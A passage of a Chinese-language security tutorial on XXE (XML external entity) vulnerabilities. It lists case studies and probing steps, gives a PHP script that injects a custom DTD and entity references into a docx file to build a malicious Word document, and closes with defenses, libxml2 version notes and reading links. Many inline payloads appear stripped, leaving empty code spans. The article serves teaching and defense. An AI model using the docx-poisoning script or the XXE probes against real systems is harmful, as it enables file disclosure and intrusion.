      * [Revisting XXE and abusing protocols](https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/) 的分析者利用该原理在其他OpenID平台结合expect模块实现了RCE。
    * [XXE on Windows system …then what ??](https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745) 【XXE+SMB=>内网RCE】
    * [Apache Solr XXE漏洞分析 -【CVE-2018-8026 】](https://xz.aliyun.com/t/2448)
    * [Phone Call to XXE via Interactive Voice Response](https://hackerone.com/reports/395296) 【打个电话也能XXE :)】
# 发现XXE
尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。
  * 单双引号 `' "` 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。
  * 尖括号``。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。
  * 注释符 `` 作注释。
  * `&` 。& 用于引用实体。
  * CDATA 分隔符`]]>` 。`` 中的内容不被parser解析，提前闭合引发异常。
尝试利用实体和DTD。
  * 引用外部DTD文件访问内网主机/端口。`` （看响应时间）
  * 引用外部DTD文件访问外网。``
  * 引用内部实体。`]>&xxe;`
  * 外部实体读本地文件。`]>&xxe;`
  * 外部实体访问内网主机/端口。``（看响应时间）
  * 外部实体访问外网。`]>&xxe;`
  * 判断问题存在可以OOB提取数据。
# 生成恶意Word文档
上面提到的多个案例都需要用到自定义DTD的docx文件，有个名为 [XXEGen](https://buer.haus/xxegen/)
的在线网站可以方便地生成和监听（也可自定义监听地址），从而方便快速地测试XXE是否存在，但目前看来还不支持自定义DTD，如果需要用到OOB之类的技术，可能就不太方便。
所以我写了个小脚本，可以用来生成一个正常docx文件，然后注入自定义的DTD和实体引用。另外新版的word软件默认禁用DTD，trigger
函数还可以本地测试下word文件是否有问题。
其实修改 docx 文件的原理很简单，手动也可以做。解压 demo.docx 到 demo文件夹 ，直接修改
`demo/word/document.xml` 文件内容，全选 demo 文件夹中的文件，使用 7zip 的仅存储方式压缩成 demo2.docx 即可。
    Visible = 0;//保持程序在后台运行
        $word->Documents->Add();//新建Word文档
        $word->Selection->TypeText($filecontent);//写入指定内容
        $word->Documents[1]->SaveAs(getcwd()."/".$filename);//保存到指定路径
        $word->Quit();//退出程序
    }
    function poisonWord($filename,$flag,$dtd,$entity_reference) {
        $zip = new ZipArchive();
        $zip->open($filename);
        $xml=$zip->getFromName('word/document.xml');
        $prolog='';
        $evilxml=str_replace([$prolog,$flag],[$prolog.$dtd,$flag.$entity_reference],$xml);//构造恶意XML
        $zip->deleteName('word/document.xml');
        $zip->addFromString("word/document.xml",$evilxml);//更新docx文件
        $zip->close();
    }
    function trigger($filename){
        $zip = new ZipArchive();
        $zip->open($filename);
        $xml=$zip->getFromName('word/document.xml');
        $doc_xml = new DOMDocument();
        $doc_xml->loadXML($xml); //加载word文档
        $zip->close();
        return $doc_xml->textContent; //读取文档内容
    }
    //在这里定义想要添加的DTD内容和想要在XML中引用的实体
    $dtd=']>';
    $entity_reference="&xxe; &int; IS EXCITING!";
    $name="demo.docx";//生成文件的文件名
    $flag="Across the Great Wall we can reach every corner in the world.";//文件内容，实体在该内容附近引用。
    genWord($name,$flag);//生成一个指定内容和文件名的正常docx文件
    poisonWord($name,$flag,$dtd,$entity_reference);//向正常文件注入DTD和实体引用，生成恶意文件
    echo trigger($name);//加载文件，测试效果
    //若程序不能正常运行，可尝试在 php.ini 末尾添加以下路径
    //extension="php_com_dotnet.dll 路径"; extension="php_mbstring.dll 路径"
    ?>
# 防御
彻底禁用DTD是最好的，退一步，禁用外部实体/外部DTD也可以。具体参考 [XML_External _Entity_
(XXE)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XML_External_Entity_\(XXE)_Prevention_Cheat_Sheet)
。
  * 禁用外部实体 (  等)
    * 对于PHP来说，尽管不同环境下`simplexml_load_string()` 默认行为并不一致，但为了安全应当总是`libxml_disable_entity_loader();` 。 
  * 检验数据来源，过滤数据
PHP及其他语言或框架，是否默认解析外部实体，解析方式和在特定场景下的解析表现，与其使用的 libxml2
版本有关（如果是基于libxml2的话），也与XML解析器及其配置有关。就PHP而言，`libxml2 Version`
可以在phpinfo里看，本文使用的是`2.7.8` 。
这可能是一个误解的结果。
> 在slimphp2中，官方是对这块进行一定处理了（。。。一些代码。。。）不知为何在3.0版本中官方就无视这个问题了。 我猜可能有两个原因：
>
>
> 1.官方注意到了这个问题，但认为3.0版本需求的php版本在5.5以上，而错以为5.5以上的php就已经不存在XXE的隐患了。但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。
>
> 2.官方尚未注意到这个问题。
>
> 感觉前者的可能性较大。
>
> —— wooyun-2015-0156208
可以结合 [change log](http://www.xmlsoft.org/news.html) 和 [GitHub
commit](https://github.com/GNOME/libxml2/commits) 了解 libxml2 各版本具体改动。
可以看到与主题较相关的有：
    v2.9.5: Sep 04 2017
        Security:Detect infinite recursion in parameter entities (Nick Wellnhofer)
        Prevent unwanted external entity reference
    v2.9.2: Oct 16 2014
        Security:
        Fix for CVE-2014-3660 billion laugh variant (Daniel Veillard),
        CVE-2014-0191 Do not fetch external parameter entities (Daniel Veillard)
    2.9.1: Apr 19 2013
        Activate detection of encoding in external subset
    2.9.0: Sep 11 2012
        Do not fetch external parsed entities
# 扩展阅读
  * [XML Out-Of-Band Data Retrieval](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
  * [XMLDTDEntityAttacks.pdf](https://www.vsecurity.com//download/publications/XMLDTDEntityAttacks.pdf)
  * [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_\(XXE)_Processing) 
  * [未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)
  * [DTD Cheat Sheet](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
  * [DTD - Syntax](https://www.tutorialspoint.com/dtd/dtd_syntax.htm)
  * [Information Security / infosec / XXE](https://phonexicum.github.io/infosec/xxe.html)
  * [XXE_payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
  * [DTD Tutorial](https://www.w3schools.com/xml/xml_dtd_intro.asp)
  * [Extensible Markup Language (XML) 1.0 (Fifth Edition)](https://www.w3.org/TR/xml/)
  * [about XML entity at msdn](https://msdn.microsoft.com/en-us/library/ms256483\(v=vs.110).aspx) 
  * Spring MVC xml绑定pojo造成的XXE （乌云papers-1911）
  * Oracle盲注结合XXE漏洞远程获取数据（乌云papers-6035）